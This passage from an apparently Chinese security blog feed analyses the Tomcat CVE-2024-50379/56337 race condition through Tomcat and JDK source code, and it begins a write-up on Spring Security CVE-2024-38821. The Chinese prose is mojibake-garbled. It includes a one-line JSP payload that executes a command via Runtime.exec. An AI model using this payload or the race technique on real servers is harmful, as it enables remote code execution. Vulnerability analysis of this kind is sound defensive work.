&#125;</span><br></pre></td></tr></table></figure>
<p>è¯¥æ–¹æ³•é¦–æ¬¡è°ƒç”¨æ—¶<code>webResource</code>ä¸º<code>null</code><br>ç„¶åä¼šè¿›å…¥åˆ°<code>StrandardRoot</code>çš„<code>getResourceInternal</code>æ–¹æ³•ä¸­ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">validateResource</span><span class="params">(<span class="type">boolean</span> useClassLoaderResources)</span> &#123;</span><br><span class="line">        <span class="comment">// It is possible that some resources will only be visible for a given</span></span><br><span class="line">        <span class="comment">// value of useClassLoaderResources. Therefore, if the lookup is made</span></span><br><span class="line">        <span class="comment">// with a different value of useClassLoaderResources than was used when</span></span><br><span class="line">        <span class="comment">// creating the cache entry, invalidate the entry. This should have</span></span><br><span class="line">        <span class="comment">// minimal performance impact as it would be unusual for a resource to</span></span><br><span class="line">        <span class="comment">// be looked up both as a static resource and as a class loader</span></span><br><span class="line">        <span class="comment">// resource.</span></span><br><span class="line">        <span class="keyword">if</span> (usesClassLoaderResources != useClassLoaderResources) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">now</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (webResource == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (webResource == <span class="literal">null</span>) &#123;</span><br><span class="line">                    webResource = root.getResourceInternal(webAppPath, useClassLoaderResources);</span><br><span class="line">                    getLastModified();</span><br><span class="line">                    getContentLength();</span><br><span class="line">                    nextCheck = ttl + now;</span><br><span class="line">                    <span class="comment">// exists() is a relatively expensive check for a file so</span></span><br><span class="line">                    <span class="comment">// use the fact that we know if it exists at this point</span></span><br><span class="line">                    <span class="keyword">if</span> (webResource <span class="keyword">instanceof</span> EmptyResource) &#123;</span><br><span class="line">                        cachedExists = Boolean.FALSE;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cachedExists = Boolean.TRUE;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¯¥æ–¹æ³•å¾ªç¯éå†<code>allResources</code>çš„æ‰€æœ‰å…ƒç´ å¹¶è°ƒç”¨å…¶<code>getResource</code>æ–¹æ³•ï¼Œç›´åˆ°æ‰æ‰¾åˆ°èµ„æºä¸ºæ­¢ã€‚<br>ç¬¬ä¸€ä¸ªè¢«è°ƒç”¨çš„<code>WebResourceSet</code>ä¸º<code>DirResourceSet</code>ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> WebResource <span class="title function_">getResourceInternal</span><span class="params">(String path, <span class="type">boolean</span> useClassLoaderResources)</span> &#123;</span><br><span class="line">        <span class="type">WebResource</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">WebResource</span> <span class="variable">virtual</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">WebResource</span> <span class="variable">mainEmpty</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (List&lt;WebResourceSet&gt; list : allResources) &#123;</span><br><span class="line">            <span class="keyword">for</span> (WebResourceSet webResourceSet : list) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!useClassLoaderResources &amp;&amp; !webResourceSet.getClassLoaderOnly() ||</span><br><span class="line">                        useClassLoaderResources &amp;&amp; !webResourceSet.getStaticOnly()) &#123;</span><br><span class="line">                    result = webResourceSet.getResource(path);</span><br><span class="line">                    <span class="keyword">if</span> (result.exists()) &#123;</span><br><span class="line">                        <span class="keyword">return</span> result;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (virtual == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (result.isVirtual()) &#123;</span><br><span class="line">                            virtual = result;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (main.equals(webResourceSet)) &#123;</span><br><span class="line">                            mainEmpty = result;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>DirResourceSet#getResource</code> æ–¹æ³•ä¸­ä¼šè°ƒç”¨<code>file</code>æ–¹æ³•æŸ¥æ‰¾æ–‡ä»¶ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> WebResource <span class="title function_">getResource</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    checkPath(path);</span><br><span class="line">    <span class="type">String</span> <span class="variable">webAppMount</span> <span class="operator">=</span> getWebAppMount();</span><br><span class="line">    <span class="type">WebResourceRoot</span> <span class="variable">root</span> <span class="operator">=</span> getRoot();</span><br><span class="line">    <span class="keyword">if</span> (path.startsWith(webAppMount)) &#123;</span><br><span class="line">        <span class="type">ResourceLock</span> <span class="variable">lock</span> <span class="operator">=</span> lockForRead(path);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> file(path.substring(webAppMount.length()), <span class="literal">false</span>);<span class="comment">// æŸ¥æ‰¾æ–‡ä»¶èµ„æº</span></span><br><span class="line">            <span class="keyword">if</span> (f == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmptyResource</span>(root, path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!f.exists()) &#123; <span class="comment">// æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è¿™æ¡ä»£ç æ‰§è¡Œå‰æˆ‘ä»¬é€šè¿‡PUTæ–¹æ³•ä¸Šä¼ çš„æ–‡ä»¶å¿…é¡»è¦è½åœ°</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmptyResource</span>(root, path, f);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (f.isDirectory() &amp;&amp; path.charAt(path.length() - <span class="number">1</span>) != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                path = path + <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FileResource</span>(root, path, f, isReadOnly(), getManifest(), <span class="built_in">this</span>, lock.key);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            unlockForRead(lock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmptyResource</span>(root, path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡<code>fileBase</code>ä¸<code>name</code>ä¸€èµ·æ„é€ æ–‡ä»¶å¯¹è±¡ï¼Œè¿™é‡Œ<code>name</code>çš„å€¼å³æˆ‘ä»¬ä¼ å…¥çš„<code>/test.jsp</code><br>ç„¶åä¼šè°ƒç”¨<code>getCanonicalPath</code>æ¥è·å¾—æ–‡ä»¶çš„è§„èŒƒåŒ–è·¯å¾„ã€‚<br>æœ€åä¼šæ¯”è¾ƒ<code>getCanonicalPath</code>æ–¹æ³•è·å–çš„è§„èŒƒåŒ–è·¯å¾„<code>canPath</code>æ˜¯å¦ä¸æ–‡ä»¶çš„ç»å¯¹è·¯å¾„<code>absPath</code>ç›¸ç­‰ï¼Œå¦‚æœä¸¤è€…ä¸æƒ³çš„åˆ™è¿”å›nullï¼Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦è¿™ä¸¤ä¸ªå€¼æ˜¯ç›¸ç­‰çš„ï¼Œ<br>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿è¯<code>canPath</code>ä¸<code>absPath</code>ç›¸ç­‰ã€‚è·Ÿè¿›<code>getCanonicalPath</code>æ–¹æ³•ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> File <span class="title function_">file</span><span class="params">(String name, <span class="type">boolean</span> mustExist)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileBase, name);</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            canPath = file.getCanonicalPath();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br><span class="line">        absPath = absPath.substring(absoluteBase.length());</span><br><span class="line">        canPath = canPath.substring(canonicalBase.length());</span><br><span class="line">    ...</span><br><span class="line">        <span class="keyword">if</span> (!canPath.equals(absPath)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!canPath.equalsIgnoreCase(absPath)) &#123;</span><br><span class="line">                logIgnoredSymlink(getRoot().getContext().getName(), absPath, canPath);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> file;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>java.io.File.getCanonicalPath</code><br>ç»§ç»­è·Ÿè¿› <code>canonicalize</code>æ–¹æ³•ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getCanonicalPath</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (isInvalid()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Invalid file path&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fs.canonicalize(fs.resolve(<span class="built_in">this</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>useCanonCaches</code> è¡¨ç¤ºæ˜¯å¦å¯ç”¨è§„èŒƒè·¯å¾„ç¼“å­˜ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ–‡ç« å¼€å¤´æåˆ°çš„é«˜ç‰ˆæœ¬<code>JDK</code>è¿™ä¸ªå€¼è¢«è®¾ä¸º<code>false</code>å¯¼è‡´æ¼æ´æ— æ³•åˆ©ç”¨çš„åŸå› ã€‚<br>æˆ‘ä»¬è¦åˆ©ç”¨æ¼æ´<code>useCanonCaches</code>çš„å€¼å¿…é¡»ä¸º<code>true</code>ï¼Œå³æˆ‘ä»¬å¸Œæœ›è¿›è¡Œè§„èŒƒåŒ–è·¯å¾„ç¼“å­˜ã€‚<br>è¯¥æ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>canonicalize0</code>æ–¹æ³•ï¼Œè¿™æ˜¯ä¸€ä¸ª<code>native</code>æ–¹æ³•ï¼Œå…·ä½“çš„ç»†èŠ‚æˆ‘å°±ä¸å†åˆ†æäº†ï¼Œæ„Ÿå…´è¶£å¯ä»¥æŸ¥çœ‹<a href="https://xz.aliyun.com/news/16337">å‚è€ƒé“¾æ¥</a>ã€‚<br><code>canonicalize0</code>æ–¹æ³•æœ‰ä¸ªç‰¹æ€§ï¼Œå…¶è§„èŒƒçš„è·¯å¾„æ—¶ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œå³å¦‚æœæˆ‘è¦è§„èŒƒä¸€ä¸ªè·¯å¾„<code>bastPath/test.jsp</code>ï¼Œ<br>è¯¥æ–¹æ³•ä¼šå»<code>basePath</code>è·¯å¾„ä¸‹æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨<code>test.jsp</code>æ–‡ä»¶ï¼Œå¦‚æœæ­¤æ—¶<code>basePath</code>ä¸‹ä¸å­˜åœ¨<code>test.jsp</code>æ–‡ä»¶ï¼Œå°†<code>basePath/test.jsp</code>è¿™ä¸ªè·¯å¾„åŸæ ·è¿”å›ï¼Œ<br>å¦‚æœ<code>basePath</code>ç›®å½•ä¸‹å­˜åœ¨<code>test.JSP</code>æ–‡ä»¶ï¼Œåˆ™è¿”å›<code>basePath/test.JSP</code>ï¼Œå³è§„èŒƒè·¯å¾„æ—¶ä¸åŒºåˆ†å¤§å°å†™ã€‚<br>æ ¹æ®è¿™ä¸ªç‰¹æ€§æˆ‘ä»¬å°±å¯ä»¥å°†ä¸€ä¸ª<code>.JSP</code>ç»“å°¾çš„é™æ€èµ„æºæ–‡ä»¶å½“ä½œåŠ¨æ€æ–‡ä»¶è§£æäº†ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">canonicalize</span><span class="params">(String path)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!useCanonCaches) &#123;</span><br><span class="line">            <span class="keyword">return</span> canonicalize0(path);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> cache.get(path);<span class="comment">// å…ˆæŸ¥æ‰¾ç¼“å­˜ï¼Œé¦–æ¬¡è®¿é—®æ—¶è¿”å›null</span></span><br><span class="line">            <span class="keyword">if</span> (res == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">resDir</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (useCanonPrefixCache) &#123;<span class="comment">// æ˜¯å¦å¯ç”¨äº†å‰ç¼€ç¼“å­˜ï¼Œå³ç¼“å­˜ç›®å½•ï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®çš„æ–‡ä»¶æ²¡æœ‰å¤šå±‚ç›®å½•ç»“æ„æ‰€ä»¥ä¸æ¶‰åŠè¿™ä¸€ç‚¹ã€‚</span></span><br><span class="line">                    dir = parentOrNull(path);</span><br><span class="line">                    <span class="keyword">if</span> (dir != <span class="literal">null</span>) &#123;</span><br><span class="line">                        resDir = prefixCache.get(dir);</span><br><span class="line">                        <span class="keyword">if</span> (resDir != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> path.substring(<span class="number">1</span> + dir.length());</span><br><span class="line">                            res = canonicalizeWithPrefix(resDir, filename);</span><br><span class="line">                            cache.put(dir + File.separatorChar + filename, res);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (res == <span class="literal">null</span>) &#123;</span><br><span class="line">                    res = canonicalize0(path);<span class="comment">// nativeæ–¹æ³•</span></span><br><span class="line">                    cache.put(path, res); <span class="comment">// å°†è§„èŒƒåŒ–çš„ç»“æœæ”¾å…¥åˆ°ç¼“å­˜ä¸­</span></span><br><span class="line">                    <span class="keyword">if</span> (useCanonPrefixCache &amp;&amp; dir != <span class="literal">null</span>) &#123; <span class="comment">// å¦‚æœå¯åŠ¨äº†å‰ç¼€ç¼“å­˜ï¼Œè¿˜éœ€è¦å¾€å‰ç¼€ç¼“å­˜æ·»åŠ ç¼“å­˜é¡¹ã€‚</span></span><br><span class="line">                        resDir = parentOrNull(res);</span><br><span class="line">                        <span class="keyword">if</span> (resDir != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(res);</span><br><span class="line">                            <span class="keyword">if</span> (f.exists() &amp;&amp; !f.isDirectory()) &#123;</span><br><span class="line">                                prefixCache.put(dir, resDir);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„æ–¹æ³•æ‰§è¡Œå®Œåä¼šå¾€<code>cache</code>ä¸­å†™å…¥è¿™æ ·çš„é”®å€¼å¯¹<code>test.jsp -&gt; test.JSP</code>ã€‚<br>å½“å‘ä¸Šå›é€€åˆ°<code>file</code>æ–¹æ³•çš„æ—¶å€™å‡ºç°é—®é¢˜äº†ã€‚<br>å†fileæ–¹æ³•ä¸­è®¡ç®—çš„<code>basePath/test.jsp</code>è®¡ç®—çš„<code>canPath</code>ä¸º<code>basePath/test.JSP</code>ï¼Œè®¡ç®—çš„<code>absPath</code>ä¸º<code>basePath/test.jsp</code>ï¼Œ<br>ä¸¤è€…ä¸ç›¸ç­‰å¯¼è‡´<code>file</code>æ–¹æ³•å°†ä¼šè¿”å›<code>null</code>ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚<br>è¿˜è®°å¾—å‰é¢æåˆ°<code>canonicalize0</code>æ–¹æ³•çš„æ—¶å€™è¯´è¿‡å…¶æœ‰ä¸€ä¸ªç‰¹æ€§æ˜¯å½“<code>basePath/test.jsp</code>æˆ–è€…<code>basePath/test.JSP</code>ç­‰æ–‡ä»¶åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ä¸å­˜åœ¨çš„æ—¶å€™ä¼šåŸæ ·è¿”å›<code>basePath/test.jsp</code>ã€‚<br>è¿™æ ·åœ¨<code>file</code>æ–¹æ³•ä¸­å¾—åˆ°çš„<code>canPath</code>å°±ä¸<code>absPath</code>ä¸€è‡´äº†ï¼Œä¹Ÿå°±èƒ½æ­£ç¡®è¿”å›<code>File</code>å¯¹è±¡äº†ã€‚<br>ç»§ç»­å‘ä¸Šå›æº¯åˆ°<code>DirResourceSet#getResource</code>æ–¹æ³•ï¼Œåœ¨æˆåŠŸè°ƒç”¨fileæ–¹æ³•æŸ¥æ‰¾åˆ°æ–‡ä»¶èµ„æºåï¼Œè°ƒç”¨<code>f.exists()</code>æ–¹æ³•ï¼Œæ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œè¿™æ˜¯æ—¶å€™éœ€è¦ä¿è¯æ–‡ä»¶ç³»ç»Ÿä¸­å­˜åœ¨æ–‡ä»¶<code>basePath/test.jsp</code>ã€‚<br>å› ä¸ºåœ¨<code>Windows</code>çš„æ–‡ä»¶ç³»ç»Ÿä¸­æ–‡ä»¶åæ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„ï¼Œæ‰€ä»¥<code>basePath/test.jsp</code>æˆ–è€…<code>basePath/test.JSP</code>å…¶å®è¡¨ç¤ºåŒä¸€ä¸ªæ–‡ä»¶ã€‚<br>æˆ‘ä»¬æ— æ³•å‡­ç©ºåˆ›å»ºä¸€ä¸ª<code>test.jsp</code>æ–‡ä»¶ï¼Œä½†æ˜¯å¯ä»¥åˆ›å»º<code>test.JSP</code>æ–‡ä»¶ï¼Œå› ä¸ºè¯¥æ–‡ä»¶åœ¨Tomcatä¸­æ˜¯ä¸€ä¸ªè¢«å½“ä½œä¸€ä¸ªé™æ€èµ„æºæ–‡ä»¶å¤„ç†çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡PUTæ–¹æ³•è¿›è¡Œä¸Šä¼ ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> WebResource <span class="title function_">getResource</span><span class="params">(String path)</span> &#123;</span><br><span class="line">        checkPath(path);</span><br><span class="line">        <span class="type">String</span> <span class="variable">webAppMount</span> <span class="operator">=</span> getWebAppMount();</span><br><span class="line">        <span class="type">WebResourceRoot</span> <span class="variable">root</span> <span class="operator">=</span> getRoot();</span><br><span class="line">        <span class="keyword">if</span> (path.startsWith(webAppMount)) &#123;</span><br><span class="line">            <span class="type">ResourceLock</span> <span class="variable">lock</span> <span class="operator">=</span> lockForRead(path);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> file(path.substring(webAppMount.length()), <span class="literal">false</span>);<span class="comment">// æˆåŠŸæ‰¾åˆ°äº†fileèµ„æº pathä¸º `basePath/test.jsp`</span></span><br><span class="line">                <span class="keyword">if</span> (f == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmptyResource</span>(root, path);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!f.exists()) &#123; <span class="comment">// æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è¿™æ¡ä»£ç æ‰§è¡Œå‰æˆ‘ä»¬é€šè¿‡PUTæ–¹æ³•ä¸Šä¼ çš„æ–‡ä»¶å¿…é¡»è¦è½åœ°</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmptyResource</span>(root, path, f);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (f.isDirectory() &amp;&amp; path.charAt(path.length() - <span class="number">1</span>) != <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    path = path + <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FileResource</span>(root, path, f, isReadOnly(), getManifest(), <span class="built_in">this</span>, lock.key);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                unlockForRead(lock);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EmptyResource</span>(root, path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>test.JSP</code>æ–‡ä»¶çš„ä¸Šä¼ æ—¶æœºæ˜¯éå¸¸é‡è¦çš„ï¼Œæˆ‘ä»¬éœ€è¦<code>canonicalize0</code>æ–¹æ³•è°ƒç”¨å®Œä¹‹å‰è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸å­˜åœ¨äºæ–‡ä»¶ç³»ç»Ÿçš„ï¼Œå¦åˆ™ç¼“å­˜ä¸­ä¿å­˜çš„å°±æ˜¯<code>a.jsp -&gt; a.JSP</code>çš„æ˜ å°„å…³ç³»ï¼Œè®¡ç®—çš„<code>canPath</code>ä¹Ÿå˜æˆäº†<code>a.JSP</code><br>è¿™æ ·ä¸èƒ½é€šè¿‡<code>absPath</code>ä¸<code>canPath</code>çš„æ¯”è¾ƒã€‚ ä¸”è¦ä¿è¯åœ¨<code>f.exists</code>è°ƒç”¨ä¹‹å‰<code>test.JSP</code>æ–‡ä»¶æˆåŠŸè½ç›˜ï¼Œå› ä¸ºæˆ‘ä»¬è¦ä¿è¯æ–‡ä»¶å­˜åœ¨å¦åˆ™å°†å“åº”ä¸€ä¸ªç©ºçš„èµ„æºå¯¹è±¡ã€‚  </p>
<p>åœ¨è°ƒè¯•ç¯å¢ƒä¸‹è¦åšåˆ°è¿™ä¸€ç‚¹æ˜¯éå¸¸ç®€å•çš„ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨<code>f.exists</code>è¿™ä¸€è¡Œä¸‹æ–­ç‚¹ï¼Œè®¿é—®<code>test.jsp</code>è¿è¡Œåˆ°è¿™ä¸€è¡Œæ—¶å†åˆ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º<code>test.JSP</code>æ–‡ä»¶ï¼Œç„¶åè®©ä»£ç ç»§ç»­æ‰§è¡Œå³å¯è§‚å¯Ÿåˆ°<code>test.JSP</code>ä¸­çš„å‘½ä»¤è¢«æ‰§è¡Œäº†ã€‚</p>
<pre><code class="language-jsp">&lt;%=Runtime.getRuntime().exec(&quot;calc&quot;)%&gt;
</code></pre>
<p><img src="/archives/172295c/img_1.png" alt="img_1.png">  </p>
<p>å®æˆ˜ç¯å¢ƒä¸‹PoCçš„å†™æ³•åœ¨äº†è§£äº†åŸç†åç›¸æ¯”å¹¶ä¸å›°éš¾ï¼ˆäººæ¯”è¾ƒæ‡’ï¼‰ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚</p>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul>
<li><a href="https://xz.aliyun.com/news/16337">Tomcat CVE-2024-50379 &#x2F; CVE-2024-56337 æ¡ä»¶ç«äº‰æ¼æ´åˆ†æ</a></li>
</ul>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>è¿œç¨‹ä»£ç æ‰§è¡Œ</tag>
        <tag>Tomcat</tag>
        <tag>æ¡ä»¶ç«äº‰</tag>
        <tag>CVE-2024-50379</tag>
        <tag>CVE-2024-56337</tag>
      </tags>
  </entry>
  <entry>
    <title>WebFluxé›†æˆSpring-Securityå—é™é™æ€èµ„æºè®¿é—®æˆæƒç»•è¿‡ï¼ˆCVE-2024-38821ï¼‰</title>
    <url>/archives/f65bb354.html</url>
    <content><![CDATA[<h1 id="WebFluxé›†æˆSpring-Securityå—é™é™æ€èµ„æºè®¿é—®æˆæƒç»•è¿‡ï¼ˆCVE-2024-38821ï¼‰"><a href="#WebFluxé›†æˆSpring-Securityå—é™é™æ€èµ„æºè®¿é—®æˆæƒç»•è¿‡ï¼ˆCVE-2024-38821ï¼‰" class="headerlink" title="WebFluxé›†æˆSpring-Securityå—é™é™æ€èµ„æºè®¿é—®æˆæƒç»•è¿‡ï¼ˆCVE-2024-38821ï¼‰"></a>WebFluxé›†æˆSpring-Securityå—é™é™æ€èµ„æºè®¿é—®æˆæƒç»•è¿‡ï¼ˆCVE-2024-38821ï¼‰</h1><h2 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h2><p><img src="/archives/f65bb354/img.png" alt="img.png">  </p>
<h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>Spring Securityä»¥ä¸‹ç‰ˆæœ¬å—å½±å“<br>5.7.0 - 5.7.12<br>5.8.0 - 5.8.14<br>6.0.0 - 6.0.12<br>6.1.0 - 6.1.10<br>6.2.0 - 6.2.6<br>6.3.0 - 6.3.3</p>
<h2 id="æ¼æ´æµ‹è¯•"><a href="#æ¼æ´æµ‹è¯•" class="headerlink" title="æ¼æ´æµ‹è¯•"></a>æ¼æ´æµ‹è¯•</h2><p>åˆ›å»ºä¸€ä¸ªSpring boot + Webflux + Spring Securityé¡¹ç›®ï¼Œå¼•å…¥ç›¸å…³ä¾èµ–  </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Spring Boot Starter for WebFlux --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-webflux<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>åˆ›å»ºé…ç½®ç±»<br>è¯¥ç±»ä¸­é…ç½®äº†é™æ€èµ„æº<code>index.html</code>éœ€è¦ç™»å½•æ‰èƒ½è®¿é—®ï¼Œå…¶ä»–urlä¸éœ€è¦è®¤è¯å³å¯è®¿é—®  </p>
